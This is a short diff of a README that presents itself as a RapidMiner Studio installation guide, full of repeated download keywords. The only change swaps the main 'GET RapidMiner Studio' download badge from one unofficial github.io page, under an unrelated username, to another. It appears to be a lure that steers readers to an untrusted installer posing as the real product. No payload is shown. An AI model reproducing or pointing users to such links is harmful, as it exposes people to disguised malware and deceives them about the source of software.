@@ -52,7 +52,7 @@ Teams use RapidMiner Studio machine learning workflows to connect data sources, 
 
 Prerequisites: A supported desktop system, enough local storage for datasets, and the correct RapidMiner Studio license or trial access before running RapidMiner Studio install.
 
-[![GET RapidMiner Studio](https://img.shields.io/badge/GET%20%E2%80%94%20RapidMiner%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://chasemathisylrz.github.io/.github/rapidminer-app)
+[![GET RapidMiner Studio](https://img.shields.io/badge/GET%20%E2%80%94%20RapidMiner%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/rapidminer-app)
 
 1.  **Download and Install:** Use rapidminer studio download, download rapidminer, rapidminer download, or RapidMiner Studio download free resources only from trusted official sources.
 2.  **Create a Workspace:** Launch RapidMiner Studio software, set up repositories, and review the welcome content, RapidMiner Studio tutorial material, and sample processes.
